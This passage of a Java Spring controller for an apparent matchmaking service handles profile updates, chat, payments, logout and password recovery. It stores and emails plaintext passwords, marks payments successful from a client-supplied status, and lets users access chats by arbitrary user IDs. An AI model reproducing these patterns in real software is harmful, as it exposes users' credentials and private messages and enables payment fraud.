			} catch (Exception e) {
				e.printStackTrace();
			}

			Education education = null;
			try {
				education = new Education();
				if(educationalSelect.equalsIgnoreCase("0") ||educationalSelect=="0")
				{
					educationalSelect="1";
				}
				education.setEducation_id(Long.parseLong(educationalSelect));
			} catch (Exception e) {
				e.printStackTrace();
			}
			Occupation occupation = null;
			// ------------------------------------------------
			try {
				occupation = new Occupation();
				
				if(occupationSelect.equalsIgnoreCase("0") ||occupationSelect=="0")
				{
					occupationSelect="1";
				}
				occupation.setOccupation_id(Long.parseLong(occupationSelect));
			} catch (Exception e) {
				e.printStackTrace();
			}
			try {
				userModelDetails.setCountry(country);
			} catch (Exception e) {
				e.printStackTrace();
			}
			try {
				userModelDetails.setState_Country(state_Country);
			} catch (Exception e) {
				e.printStackTrace();
			}
			try {
				userModelDetails.setDistricts(state_Districts);
			} catch (Exception e) {
				e.printStackTrace();
			}
			try {
				userModelDetails.setSubDistricts(district_SubDistricts);
			} catch (Exception e) {
				e.printStackTrace();
			}
			try {
				userModelDetails.setCaste(caste);
			} catch (Exception e) {
				e.printStackTrace();
			}
			try {
				userModelDetails.setEducation(education);
			} catch (Exception e) {
				e.printStackTrace();
			}
			try {
				userModelDetails.setOccupation(occupation);
			} catch (Exception e) {
				e.printStackTrace();
			}
			try {
				userModelDetails.setBodyType(bodyType);
			} catch (Exception e) {
				e.printStackTrace();
			}
			try {
				userModelDetails.setComplexion(complexion);
			} catch (Exception e) {
				e.printStackTrace();
			}
			try {
				userModelDetails.setIncomeType(income);
			} catch (Exception e) {
				e.printStackTrace();
			}
			try {
				userModelDetails.setIncomeAmount(Long.parseLong(incomeAmount));
			} catch (Exception e) {
				e.printStackTrace();
			}
			try {
				userModelDetails.setFamilyClass(familyClassInfo);
			} catch (Exception e) {
				e.printStackTrace();
			}
			try {
				userModelDetails.setFamilyType(familyTypeInfo);
			} catch (Exception e) {
				e.printStackTrace();
			}
			try {
				userModelDetails.setFamilyValues(familyValueInfo);
			} catch (Exception e) {
				e.printStackTrace();
			}
			try {
				userModelDetails.setEating(eating);
			} catch (Exception e) {
				e.printStackTrace();
			}
			try {
				userModelDetails.setSmoke(smoke);
			} catch (Exception e) {
				e.printStackTrace();
			}
			try {
				userModelDetails.setDrink(drink);
			} catch (Exception e) {
				e.printStackTrace();
			}

			// dateOfBirth email mobileNum profileCreatedFor lastLoginDate
			// gender profileUpdateDate registrationDate
			try {
				userModelDetails.setEmail(email);
			} catch (Exception e) {
				e.printStackTrace();
			}

			try {
				userModelDetails.setProfileCreatedFor(ProfileCreatedFor);
			} catch (Exception e) {
				e.printStackTrace();
			}
			try {
				userModelDetails.setMobileNum(mobile);
			} catch (Exception e) {
				e.printStackTrace();
			}
			try {
				userModelDetails.setGender(gender);
			} catch (Exception e) {
				e.printStackTrace();
			}
			try {
				userModelDetails.setLastLoginDate(new Date());
			} catch (Exception e) {
				e.printStackTrace();
			}
			try {
				userModelDetails.setRegistrationDate(new Date());
			} catch (Exception e) {
				e.printStackTrace();
			}
			try {
				userModelDetails.setProfileUpdateDate(new Date());
			} catch (Exception e) {
				e.printStackTrace();
			}

			// temporary used data dob
			try {
				DateFormat formatter = new SimpleDateFormat("dd/MM/yyyy");
				Date DateOfBirth = formatter.parse(dob);
				userModelDetails.setDateOfBirth(DateOfBirth);
			} catch (Exception e) {
				e.printStackTrace();
			}
			try {
				userModelDetails.setEmployeedIn(employedIn);
			} catch (Exception e) {
				e.printStackTrace();
			}
			try {
				userModelDetails = userService.addUserdetails(userModelDetails);
				userService.updateUserFullName(userModelId, firstName);
			} catch (Exception e) {
				e.printStackTrace();
			}

			try {

				js.put("code", "1000");
				js.put("Message", "User Details Updated successfully");
				json = js.toString();
			} catch (Exception e) {

				js.put("code", "1001");
				js.put("Message", e.getMessage());
				json = js.toString();
			}

		} catch (Exception e) {

		}
		return json;
	}

	@RequestMapping(value = "/sneh/login/mobileUpdatePartnerDetails ", method = RequestMethod.POST)
	@ResponseBody
	public String mobileUpdatePartnerDetails(final HttpServletRequest request,
			@RequestParam("partnerDetailsDict") String dict) {

		JSONObject obj;
		JSONObject js = new JSONObject();
		String json = null;
		try {

			obj = new JSONObject(dict);
			final JSONObject jsonObj = obj;
			String userModelId = jsonObj.getString("userModelId");

			String materialStatusPartner = jsonObj.getString("materialStatusPartner");
			String physicalStatusPartner = jsonObj.getString("physicalStatusPartner");
			String bodyTypePartner = jsonObj.getString("bodyTypePartner");
			String complexionPartner = jsonObj.getString("complexionPartner");
			String heightSelectPartnerFirst = jsonObj.getString("heightSelectPartnerFirst");
			String heightSelectPartnerSecond = jsonObj.getString("heightSelectPartnerSecond");
			String countrySelectPartner = jsonObj.getString("countrySelectPartner");
			String stateSelectPartner = jsonObj.getString("stateSelectPartner");
			String cityStateSelectPartnerPreferance = jsonObj.getString("cityStateSelectPartnerPreferance");
			String religionSelectPartner = jsonObj.getString("religionSelectPartner");
			String casteSelectPartner = jsonObj.getString("casteSelectPartner");

			String checkBoxEducationPartner = jsonObj.getString("checkBoxEducationPartner");
			String checkBoxOccupationPartner = jsonObj.getString("checkBoxOccupationPartner");
			String incomePartner = jsonObj.getString("incomePartner");
			String incomeAmountPartner = jsonObj.getString("incomeAmountPartner");
			String familyClassInfoPartner = jsonObj.getString("familyClassInfoPartner");
			String familyTypeInfoPartner = jsonObj.getString("familyTypeInfoPartner");
			String familyValueInfoPartner = jsonObj.getString("familyValueInfoPartner");
			String eatingPartner = jsonObj.getString("eatingPartner");
			String drinkPartner = jsonObj.getString("drinkPartner");
			String smokePartner = jsonObj.getString("smokePartner");
			String employedInPartner = jsonObj.getString("employedInPartner");

			UserModel userModel = new UserModel();
			userModel.setUserId(Long.parseLong(userModelId));

			Country countryPartner = null;
			try {
				if(countrySelectPartner.equalsIgnoreCase("0")||countrySelectPartner=="0")
				{
					countrySelectPartner="1";
				}
				countryPartner = new Country();
				countryPartner.setCountry_id(Integer.parseInt(countrySelectPartner));
			} catch (Exception e) {
				e.printStackTrace();
			}
			State_Country state_CountryPartner = null;
			try {
				if(stateSelectPartner.equalsIgnoreCase("0")||stateSelectPartner=="0")
				{
					stateSelectPartner="1";
				}
				state_CountryPartner = new State_Country();
				state_CountryPartner.setState_Country_id(Integer.parseInt(stateSelectPartner));
			} catch (Exception e) {
				e.printStackTrace();
			}
			State_Districts state_DistrictsPartner = null;
			try {
				if(cityStateSelectPartnerPreferance.equalsIgnoreCase("0")||cityStateSelectPartnerPreferance=="0")
				{
					cityStateSelectPartnerPreferance="1";
				}
				state_DistrictsPartner = new State_Districts();
				state_DistrictsPartner.setState_district_id(Integer.parseInt(cityStateSelectPartnerPreferance));
			} catch (Exception e) {
				e.printStackTrace();
			}
			Religion religionPartner = new Religion();
			try {
				
				religionPartner = new Religion();
				religionPartner.setReligion_id(Long.parseLong(religionSelectPartner));
			} catch (Exception e) {
				e.printStackTrace();
			}
			Caste castePartner = null;
			try {
				
				castePartner = new Caste();
				castePartner.setCaste_id(Long.parseLong(casteSelectPartner));
			} catch (Exception e) {
				e.printStackTrace();
			}

			UserModelPartnerPreferances userModelPartnerPreferances = userService
					.getUserModelPartnerPreferancesByUserModelId(userModel);

			try {
				userModelPartnerPreferances.setUserModel(userModel);
			} catch (Exception e) {
				e.printStackTrace();
			}
			try {
				userModelPartnerPreferances.setMaterialStatus(materialStatusPartner);
			} catch (Exception e) {
				e.printStackTrace();
			}
			try {
				userModelPartnerPreferances.setPhysicalStatus(physicalStatusPartner);
			} catch (Exception e) {
				e.printStackTrace();
			}
			try {
				userModelPartnerPreferances.setHeightFrom(Double.parseDouble(heightSelectPartnerFirst));
			} catch (Exception e) {
				e.printStackTrace();
			}
			try {
				userModelPartnerPreferances.setHeightTo(Double.parseDouble(heightSelectPartnerSecond));
			} catch (Exception e) {
				e.printStackTrace();
			}
			try {
				userModelPartnerPreferances.setBodyType(bodyTypePartner);
			} catch (Exception e) {
				e.printStackTrace();

			}

			try {
				userModelPartnerPreferances.setComplexion(complexionPartner);
			} catch (Exception e) {
				e.printStackTrace();

			}

			try {
				userModelPartnerPreferances.setCountry(countryPartner);
			} catch (Exception e) {
				e.printStackTrace();

			}
			try {
				userModelPartnerPreferances.setState_Country(state_CountryPartner);
			} catch (Exception e) {
				e.printStackTrace();

			}

			try {
				userModelPartnerPreferances.setDistricts(state_DistrictsPartner);
			} catch (Exception e) {
				e.printStackTrace();

			}
			try {
				userModelPartnerPreferances.setReligion(religionPartner);
			} catch (Exception e) {
				e.printStackTrace();
			}
			try {
				userModelPartnerPreferances.setCaste(castePartner);
			} catch (Exception e) {
				e.printStackTrace();
			}
			try {
				userModelPartnerPreferances.setIncomeType(incomePartner);
			} catch (Exception e) {
				e.printStackTrace();
			}
			try {
				userModelPartnerPreferances.setIncomeAmount(Long.parseLong(incomeAmountPartner));
			} catch (Exception e) {
				userModelPartnerPreferances.setIncomeAmount(Long.parseLong(0 + ""));
				e.printStackTrace();
			}

			try {
				userModelPartnerPreferances.setFamilyClass(familyClassInfoPartner);
			} catch (Exception e) {
				e.printStackTrace();
			}
			try {
				userModelPartnerPreferances.setFamilyType(familyTypeInfoPartner);
			} catch (Exception e) {
				e.printStackTrace();
			}
			try {
				userModelPartnerPreferances.setFamilyValues(familyValueInfoPartner);
			} catch (Exception e) {
				e.printStackTrace();
			}
			try {
				userModelPartnerPreferances.setEating(eatingPartner);
			} catch (Exception e) {
				e.printStackTrace();
			}
			try {
				userModelPartnerPreferances.setDrink(drinkPartner);
			} catch (Exception e) {
				e.printStackTrace();
			}
			try {
				userModelPartnerPreferances.setSmoke(smokePartner);
			} catch (Exception e) {
				e.printStackTrace();
			}
			try {
				userModelPartnerPreferances.setEmployeedIn(employedInPartner);
			} catch (Exception e) {
				e.printStackTrace();
			}
			try {
				userModelPartnerPreferances = userService.addUserPartnerPreferances(userModelPartnerPreferances);
			} catch (Exception e) {
				e.printStackTrace();
			}

			userService.deletePartnerEducationAssociationByUserModel(userModel);
			userService.deletePartnerOccuptionAssociationByUserModel(userModel);

			// Now again save the new Changes

			String[] parts = checkBoxEducationPartner.split(",");

			for (String string : parts) {

				try {

					
					long l=Long.parseLong(string);
					if(l==0)
					{
						l=1;
					}
					EducationCategory educationCategory = new EducationCategory();
					educationCategory.setEdu_cat_id(l);
					PartnerEducationAssociation educationAssociation = new PartnerEducationAssociation();
					educationAssociation.setUserModel(userModel);
					educationAssociation.setEducationCategory(educationCategory);
					userService.savePartnerEducationAssociation(educationAssociation);

				} catch (Exception e) {
					e.printStackTrace();
				}

			}

			String[] parts2 = checkBoxOccupationPartner.split(",");

			for (String string : parts2) {

				try {

					OccupationCategory OccupationCategory = new OccupationCategory();
					
					long l=Long.parseLong(string);
					if(l==0)
					{
						l=1;
					}
					OccupationCategory.setOccu_id(l);
					PartnerOccupationAssociation occupationAssociation = new PartnerOccupationAssociation();
					occupationAssociation.setUserModel(userModel);
					occupationAssociation.setOccupationCategory(OccupationCategory);
					userService.savePartnerOccupationAssociation(occupationAssociation);

				} catch (Exception e) {
					e.printStackTrace();
				}

			}

			try {

				js.put("code", "1000");
				js.put("Message", "User partner details updated successfully");
				json = js.toString();
			} catch (Exception e) {

				js.put("code", "1001");
				js.put("Message", e.getMessage());
				json = js.toString();
			}
		} catch (Exception e) {
			e.printStackTrace();

		}
		return json;
	}

	//

	@RequestMapping(value = "/sneh/login/mobileLatestMatch", method = RequestMethod.POST)
	@ResponseBody
	public String mobileLatestMatch(HttpServletRequest request, @RequestParam("username") String username,
			@RequestParam("password") String password) {

		UserModel userModel = loginService.getUserByUnamePassword(username, password);

		JSONObject js = new JSONObject();
		ObjectWriter ow = new ObjectMapper().writer().withDefaultPrettyPrinter();
		String json = null;

		try {

		} catch (Exception e) {

		}

		return json;

	}

	@RequestMapping(value = "/sneh/login/logout", method = RequestMethod.POST)
	@ResponseBody
	public String logout(HttpServletRequest request, @RequestParam("username") String username,
			@RequestParam("password") String password) {

		UserModel userModel = loginService.getUserByUnamePassword(username, password);
		try {
			if (userModel == null) {

			} else if ((userModel.getUserName().equals(username)) && (userModel.getPassword().equals(password))) {
			} else {
				userModel = null;
			}

		} catch (Exception e) {

		}
		JSONObject js = new JSONObject();
		String json = null;
		if (userModel != null) {

			userModel.setDeviceToken(null);
			userService.addUser(userModel);
			
			
			try {
				
				UserModelDetails modelDetails = userService.getUserdetails(userModel);

				if (modelDetails != null) {
					userService.deleteOnlineUser(modelDetails.getUserModel());
				}
				
			} catch (Exception e) {
				// TODO: handle exception
			}

			ObjectWriter ow = new ObjectMapper().writer().withDefaultPrettyPrinter();

			try {
				js.put("Logout", "Success");
				js.put("code", "1000");
				json = js.toString();
			} catch (Exception e) {
				try {
					js.put("code", "1001");
					js.put("ErrorMessage", e.getMessage());
					json = js.toString();
				} catch (JSONException e1) {
					e1.printStackTrace();
				}
				e.printStackTrace();
			}
		} else {

			try {
				js.put("code", "1001");
				json = js.toString();
			} catch (JSONException e) {
				try {
					js.put("code", "1001");
					js.put("ErrorMessage", e.getMessage());
					json = js.toString();
				} catch (JSONException e1) {
					e1.printStackTrace();
				}
				e.printStackTrace();
			}
		}
		return json;
	}
	
	
	@RequestMapping(value = "/sneh/login/saveMobileChat", method = RequestMethod.POST)
	@ResponseBody
	public String saveMobileChat(final HttpServletRequest request, @RequestParam("username") String username,
			@RequestParam("password") String password,@RequestParam("chatDict") String dict) {

		UserModel userModel = loginService.getUserByUnamePassword(username, password);

		try {
			if (userModel == null) {

			} else if ((userModel.getUserName().equals(username)) && (userModel.getPassword().equals(password))) {
			} else {
				
				userModel = null;
			}

		} catch (Exception e) {

		}
		
		JSONObject obj ;
		JSONObject js = new JSONObject();
		String json = null;
		
			try {
				if (userModel != null) {
					
					
					obj = new JSONObject(dict);
					final JSONObject jsonObj = obj;
					org.hibernate.Session session=sessionFactory.openSession();
					final String msg = jsonObj.getString("msg");
					final String userFrom = jsonObj.getString("userFrom");
					final String userTo = jsonObj.getString("userTo");
					final UserModel modelFrom=(UserModel) session.get(UserModel.class, new Long(Integer.parseInt(userFrom)));
					final UserModel modelTo=(UserModel) session.get(UserModel.class, new Long(Integer.parseInt(userTo)));
					chatService.saveChatting(msg, new Date(), modelFrom, modelTo);
					session.close();
					
					Thread t=new Thread(new Runnable() {
						
						@Override
						public void run() {
							
							FcmNotification fcmNotification = notificationService.getFcmNotification();
							notificationService.sendChatFcmNotification(msg, modelFrom, modelTo, fcmNotification, request);
							
							
						}
					});
					t.start();
					
					js.put("Message", msg);
					js.put("userName", modelFrom.getFirstName());
					js.put("Date", new Date().getTime());
					js.put("code", "1000");
					json = js.toString();
				}
				else
				{
					js.put("code", "1001");
					json = js.toString();
				}

				
			} catch (Exception e) {
				
				try {
					js.put("code", "1001");
					js.put("ErrorMessage", e.getMessage());
					json = js.toString();
				} catch (JSONException e1) {
					e1.printStackTrace();
				}
				e.printStackTrace();
			}

		
		return json;

	}
	
	
	@RequestMapping(value = "/sneh/login/loadMobileChat", method = RequestMethod.POST)
	@ResponseBody
	public String loadMobileChat(HttpServletRequest request, @RequestParam("username") String username,
			@RequestParam("password") String password,@RequestParam("chatDict") String dict) {

		UserModel userModel = loginService.getUserByUnamePassword(username, password);

		try {
			if (userModel == null) {

			} else if ((userModel.getUserName().equals(username)) && (userModel.getPassword().equals(password))) {
			} else {
				
				userModel = null;
			}

		} catch (Exception e) {

		}
		
		JSONObject obj ;
		JSONObject js = new JSONObject();
		String json = null;
		
			try {
				if (userModel != null) {
					
					
					obj = new JSONObject(dict);
					final JSONObject jsonObj = obj;
					org.hibernate.Session session=sessionFactory.openSession();
					String userFrom = jsonObj.getString("userFrom");
					String userTo = jsonObj.getString("userTo");
					UserModel modelFrom=(UserModel) session.get(UserModel.class, new Long(Integer.parseInt(userFrom)));
					UserModel modelTo=(UserModel) session.get(UserModel.class, new Long(Integer.parseInt(userTo)));
					List<Chat>chatList=	chatService.getListOfChatAccordingToUser(modelFrom, modelTo);
					session.close();
					
					List<chatView> chatView= new ArrayList<>();
					
					for (Chat chat : chatList) {
						
						chatView chatviewobj=new chatView();
						chatviewobj.setChatId(String.valueOf(chat.getChatId()));
						chatviewobj.setChatText(chat.getChatText());
						chatviewobj.setUserModelFrom(String.valueOf(chat.getUserModelFrom().getUserId()));
						chatviewobj.setUserModelTo(String.valueOf(chat.getUserModelTo().getUserId()));
						chatviewobj.setChatdate(chat.getChatdate());
						chatviewobj.setUserName(chat.getUserModelFrom().getFirstName());
						chatView.add(chatviewobj);
						
					}
					
					
					ObjectWriter ow = new ObjectMapper().writer().withDefaultPrettyPrinter();
					js.put("code", "1000");
					js.put("chatList", ow.writeValueAsString(chatView));
					json = js.toString();
				}
				else
				{
					js.put("code", "1001");
					json = js.toString();
				}

				
			} catch (Exception e) {
				
				try {
					js.put("code", "1001");
					js.put("ErrorMessage", e.getMessage());
					json = js.toString();
				} catch (JSONException e1) {
					e1.printStackTrace();
				}
				e.printStackTrace();
			}

		
		return json;

	}

	
	
	
	@RequestMapping(value = "/sneh/login/mobilePaymentGatewayResponse", method = RequestMethod.POST)
	@ResponseBody
	public String mobilePaymentGatewayResponse(HttpServletRequest request, @RequestParam("username") String username,
			@RequestParam("password") String password,@RequestParam("userId") String userId,
			@RequestParam("amount") String amount,@RequestParam("packageId") String packageId,
			@RequestParam("transactionId") String transactionId,@RequestParam("emailId") String emailId,
			@RequestParam("phoneNum") String phoneNum,@RequestParam("status") String status,
			@RequestParam("productInfo") String productInfo) {

		UserModel userModel = loginService.getUserByUnamePassword(username, password);

		try {
			if (userModel == null) {

			} else if ((userModel.getUserName().equals(username)) && (userModel.getPassword().equals(password))) {
			} else {
				
				userModel = null;
			}

		} catch (Exception e) {

		}
		
		JSONObject obj ;
		JSONObject js = new JSONObject();
		String json = null;
		
			try {
				if (userModel != null) {
					
					final UserModelDetails modelDetails = userService.getUserdetails(userModel);

					PaymentGatewayTransactionSummary gatewayTransactionSummary = new PaymentGatewayTransactionSummary();
					gatewayTransactionSummary.setPhone(phoneNum);
					gatewayTransactionSummary.setStatus(status);
					gatewayTransactionSummary.setProductinfo(productInfo);
					gatewayTransactionSummary.setAmount(amount);
					gatewayTransactionSummary.setTxn_Id(transactionId);
					gatewayTransactionSummary.setUserModel(userModel);
					gatewayTransactionSummary.setTxn_date(new Date());
					try {
						
						
						
						
						PaymentGatewayTransactionSummary txtObj=paymentGatewayService.getPaymentGatewayTransactionSummaryByTransactionId(transactionId);
						if(txtObj!=null)
						{
							
							js.put("code", "1000");
							js.put("Message", "Failure Transaction Id Is Duplicate Please Make Payment Again");
							json = js.toString();
							return json;
						}
						
						
					} catch (Exception e) {
						
						js.put("code", "1001");
						json = js.toString();
						return json;
						
					}

					try {
						
						if (status.equalsIgnoreCase("success")) {

							Package packageObj = packageAndKitService.getPackageByPackageId(Integer.parseInt(packageId));

							Kit kit = new Kit();
							String kitUserNamePassword = new Date().getTime() + "";
							kit.setKit_username(kitUserNamePassword);
							kit.setKit_password(kitUserNamePassword);

							kit.setPackage_id(packageObj);

							if (packageObj != null) {
							} else {
								packageObj = packageAndKitService.getPackageByPackageName(productInfo);
							}

							kit = packageAndKitService.saveKit(kitUserNamePassword, kitUserNamePassword,
									packageObj.getPackage_id() + "");

							kit = kitService.getkitByKitId(kit.getKit_id());
							Status status_id = new Status();
							status_id.setStatus_id(1);
							kit.setStatus_id(status_id);
							kitService.updateKitStatus(kit);
							userModel.setKit(kit);
							userService.addUser(userModel);

							gatewayTransactionSummary.setPackage_Id(packageObj);
							gatewayTransactionSummary.setKit(kit);

							List<Kit_Upgrade_Or_Reg_Details> list_kit_Upgrade_Or_Reg_Details = kitUpgradeAndPaymentService
									.getKit_upgrade_or_reg_detailsByUserModel(userModel);

							if (list_kit_Upgrade_Or_Reg_Details.size() == 0) {
								Kit_Upgrade_Or_Reg_History_Details history_Details = new Kit_Upgrade_Or_Reg_History_Details();
								Kit_Upgrade_Or_Reg_Details kit_Upgrade_Or_Reg_Details = new Kit_Upgrade_Or_Reg_Details();
								kit_Upgrade_Or_Reg_Details.setKit_id(kit);
								kit_Upgrade_Or_Reg_Details.setNo_of_email(Integer.parseInt(kit.getPackage_id().getNo_of_email()));
								kit_Upgrade_Or_Reg_Details.setNo_of_email(Integer.parseInt(kit.getPackage_id().getNo_of_email()));
								kit_Upgrade_Or_Reg_Details.setNo_of_msg(Integer.parseInt(kit.getPackage_id().getNo_of_msg()));
								kit_Upgrade_Or_Reg_Details
										.setNo_of_profile(Integer.parseInt(kit.getPackage_id().getNo_of_profiles()));
								kit_Upgrade_Or_Reg_Details.setUserModel(userModel);

								// todo add no of days
								kit_Upgrade_Or_Reg_Details.setStatus("New");
								kit_Upgrade_Or_Reg_Details.setRegistrationDate(new Date());
								Calendar c = new GregorianCalendar();
								c.add(Calendar.DATE, Integer.parseInt(kit.getPackage_id().getNo_of_days()));
								Date expiredate = c.getTime();
								kit_Upgrade_Or_Reg_Details.setExpiryDate(expiredate);

								kitUpgradeAndPaymentService.saveKit_upgrade_or_reg_details(kit_Upgrade_Or_Reg_Details);
								try {
									history_Details.setExpiryDate(kit_Upgrade_Or_Reg_Details.getExpiryDate());
									history_Details.setRegistrationDate(kit_Upgrade_Or_Reg_Details.getRegistrationDate());
									history_Details.setActualUsedDate(new Date());
									history_Details.setDate(new Date());

									history_Details.setNo_of_msg(kit_Upgrade_Or_Reg_Details.getNo_of_msg());
									history_Details.setNo_of_email(kit_Upgrade_Or_Reg_Details.getNo_of_email());
									history_Details.setNo_of_profile(kit_Upgrade_Or_Reg_Details.getNo_of_profile());
									history_Details.setStatus(kit_Upgrade_Or_Reg_Details.getStatus());
									history_Details.setKit_id(kit_Upgrade_Or_Reg_Details.getKit_id());
									history_Details.setPayment(Double.parseDouble(kit.getPackage_id().getAmount()));
									history_Details.setUserModel(kit_Upgrade_Or_Reg_Details.getUserModel());
									kitService.saveKit_Upgrade_Or_Reg_History_Details(history_Details);
								} catch (Exception e) {

								}

							} else if (list_kit_Upgrade_Or_Reg_Details.size() > 0) {

								Kit_Upgrade_Or_Reg_History_Details history_Details = new Kit_Upgrade_Or_Reg_History_Details();
								Kit_Upgrade_Or_Reg_Details kit_Upgrade_Or_Reg_Details = list_kit_Upgrade_Or_Reg_Details.get(0);

								int old_no_msg = 0;
								int old_no_email = 0;
								int old_no_profile = 0;

								old_no_msg = kit_Upgrade_Or_Reg_Details.getNo_of_msg();
								old_no_email = kit_Upgrade_Or_Reg_Details.getNo_of_email();
								old_no_profile = kit_Upgrade_Or_Reg_Details.getNo_of_profile();

								kit_Upgrade_Or_Reg_Details.setKit_id(kit);
								kit_Upgrade_Or_Reg_Details
										.setNo_of_email(old_no_email + Integer.parseInt(kit.getPackage_id().getNo_of_email()));

								kit_Upgrade_Or_Reg_Details
										.setNo_of_msg(old_no_msg + Integer.parseInt(kit.getPackage_id().getNo_of_msg()));

								kit_Upgrade_Or_Reg_Details.setNo_of_profile(
										old_no_profile + Integer.parseInt(kit.getPackage_id().getNo_of_profiles()));

								kit_Upgrade_Or_Reg_Details.setUserModel(userModel);

								long diff = kit_Upgrade_Or_Reg_Details.getExpiryDate().getTime() - new Date().getTime();

								// long diffSeconds = diff / 1000 % 60;
								long diffMinutes = diff / (60 * 1000) % 60;
								long diffHours = diff / (60 * 60 * 1000) % 24;
								long diffDays = diff / (24 * 60 * 60 * 1000);
								int flag = 0;
								if (diffDays >= 1) {
									flag = 1;
								} else if (diffHours >= 1) {
									flag = 1;
								} else if (diffMinutes >= 1) {
									flag = 1;
								}

								if (flag == 1) {
									// todo add no of days
									kit_Upgrade_Or_Reg_Details.setStatus("ReNew");

									Calendar c = new GregorianCalendar();
									c.setTime(kit_Upgrade_Or_Reg_Details.getExpiryDate());
									kit_Upgrade_Or_Reg_Details.setRegistrationDate(c.getTime());
									c.add(Calendar.DATE, Integer.parseInt(kit.getPackage_id().getNo_of_days()));
									Date expiredate = c.getTime();
									kit_Upgrade_Or_Reg_Details.setExpiryDate(expiredate);
								} else {
									kit_Upgrade_Or_Reg_Details.setStatus("ReNew");
									kit_Upgrade_Or_Reg_Details.setRegistrationDate(new Date());
									Calendar c = new GregorianCalendar();
									c.add(Calendar.DATE, Integer.parseInt(kit.getPackage_id().getNo_of_days()));
									Date expiredate = c.getTime();
									kit_Upgrade_Or_Reg_Details.setExpiryDate(expiredate);
								}

								kitUpgradeAndPaymentService.updateKit_upgrade_or_reg_details(kit_Upgrade_Or_Reg_Details);
								try {
									history_Details.setExpiryDate(kit_Upgrade_Or_Reg_Details.getExpiryDate());
									history_Details.setRegistrationDate(kit_Upgrade_Or_Reg_Details.getRegistrationDate());
									history_Details.setActualUsedDate(new Date());
									history_Details.setDate(new Date());
									history_Details.setNo_of_msg(kit_Upgrade_Or_Reg_Details.getNo_of_msg());
									history_Details.setNo_of_email(kit_Upgrade_Or_Reg_Details.getNo_of_email());
									history_Details.setNo_of_profile(kit_Upgrade_Or_Reg_Details.getNo_of_profile());
									history_Details.setStatus(kit_Upgrade_Or_Reg_Details.getStatus());
									history_Details.setKit_id(kit_Upgrade_Or_Reg_Details.getKit_id());
									history_Details.setPayment(Double.parseDouble(kit.getPackage_id().getAmount()));
									history_Details.setUserModel(kit_Upgrade_Or_Reg_Details.getUserModel());
									kitService.saveKit_Upgrade_Or_Reg_History_Details(history_Details);
								} catch (Exception e) {

								}

							}

						} else {

						}

					} catch (Exception e) {
						e.printStackTrace();
					}
					try {
						
						paymentGatewayService.savePaymentGatewayTransactionSummary(gatewayTransactionSummary);
					} catch (Exception e) {
						e.printStackTrace();
					}

				
					String additionalCharges = request.getParameter("additionalCharges");

					
					List<Package> packages = packageAndKitService.getListOfPackage();
					js.put("code", "1000");
					js.put("Message", "Success");
					json = js.toString();
				}
				else
				{
					js.put("code", "1001");
					json = js.toString();
				}

				
			} catch (Exception e) {
				
				try {
					js.put("code", "1001");
					js.put("ErrorMessage", e.getMessage());
					json = js.toString();
				} catch (JSONException e1) {
					e1.printStackTrace();
				}
				e.printStackTrace();
			}

		
		return json;

	}
	
	

	@RequestMapping(value = "/sneh/login/successTransaction", method = RequestMethod.POST)
	@ResponseBody
	public String success(HttpServletRequest request) {
		return "success";
	}
	
	
	@RequestMapping(value = "/sneh/login/mobileForgotPassword", method = RequestMethod.POST)
	@ResponseBody
	public String mobileForgotPasswor(HttpServletRequest request, @RequestParam("email") String email,
			@RequestParam("type") String type) {

		JSONObject js = new JSONObject();
		ObjectWriter ow = new ObjectMapper().writer().withDefaultPrettyPrinter();
		String json = null;
		
		final String email2 = email;
		final String mob=email;

		try {
			
			
			if(type.equalsIgnoreCase("byEmail"))
			{
				HashMap<String, String> userDetail = passwordservice.getUserNamePasswordAccordingToEmailId(email);

				if (userDetail == null) {
					
					js.put("code", 1000);
					js.put("Message", "Email Id Not Registered");
					json=js.toString();
					return json;
					
				} else {

					try {
						
						final String userName = userDetail.get("userName");
						final String password = userDetail.get("password");

						final HttpServletRequest req = request;
						org.hibernate.Session session = sessionFactory.openSession();
						Criteria criteria = session.createCriteria(ServerInfo.class);
						List<ServerInfo> list = criteria.list();
						session.close();
						final ServerInfo serverInfo = list.get(0);
						passwordservice.sendPasswordEmail(userName, password, email2, req, serverInfo);
						js.put("code", 1000);
						js.put("Message", " Password Send Successfully");
						json=js.toString();
						
						
					} catch (Exception e) {
						
						js.put("code", 1001);
						js.put("Message", "Password Not Send");
						json=js.toString();
						
					}
					return json;
				} 
				
			}
			
			if(type.equalsIgnoreCase("byText"))
			{
				try {
					

					HashMap<String, String> userDetail =passwordservice.getUserNamePasswordAccordingToMobile(mob);
					if (userDetail == null) {
						
						js.put("code", 1000);
						js.put("Message", "Mobile Number Not Registered");
						json=js.toString();
						return json;
						
					} else {
						
						
						try {
							
							final String userName = userDetail.get("userName");
							final String password = userDetail.get("password");
							passwordservice.sendpasswordMessage(mob,userName,password);
							js.put("code", 1000);
							js.put("Message", "Password Send Successfully");
							json=js.toString();
							
							
							
						} catch (Exception e) {
							js.put("code", 1001);
							js.put("Message", "Password Not Send");
							json=js.toString();
						}
						
						return json;
					}
					
					
				} catch (Exception e) {
					
					js.put("code", 1001);
					js.put("Message", "Password Not Send");
					json=js.toString();
				}
			}
			
			

		} catch (Exception e) {
			
			

		}

		return json;

	}
	
	@RequestMapping(value = "/sneh/login/refine_search_conversation", method = RequestMethod.POST)
	@ResponseBody
	public String mobilerefine_search_conversation(HttpServletRequest request, @RequestParam("username") String username,
			@RequestParam("password") String password,
			@RequestParam("refineheightSelectPartnerFirst") final String refineheightSelectPartnerFirst,
			@RequestParam("refineheightSelectPartnerSecond") final String refineheightSelectPartnerSecond,
			@RequestParam("refineageFrom") final String refineageFrom,
			@RequestParam("refineageTo") final String refineageTo,
			@RequestParam("refinematerialStatus") final String refinematerialStatus,
			@RequestParam("refinereligionSelectPartner") final String refinereligionSelectPartner,
			@RequestParam("casteSelect") final String casteSelect,
			@RequestParam("refineoccupationCategorySelect") final String refineoccupationCategorySelect,
			@RequestParam("checkBoxDistrict")  String checkBoxDistrict)
			{

		UserModel userModel = loginService.getUserByUnamePassword(username, password);

		try {
			if (userModel == null) {

			} else if ((userModel.getUserName().equals(username)) && (userModel.getPassword().equals(password))) {
			} else {
				userModel = null;
			}

		} catch (Exception e) {

		}

		JSONObject js = new JSONObject();
		ObjectWriter ow = new ObjectMapper().writer().withDefaultPrettyPrinter();
		String json = null;
		if ((userModel != null)) {
			try {
				HttpSession httpSession = request.getSession();
				httpSession.setAttribute("ActUserName", userModel.getFirstName());
				UserModelDetails modelDetails = userService.getUserdetails(userModel);
				
				List<UserProfileView> profileViews;
				if (modelDetails.getGender().equalsIgnoreCase("male")) {
					profileViews = userService.getlistOfRefineSearchByUser(request, userModel, "female",
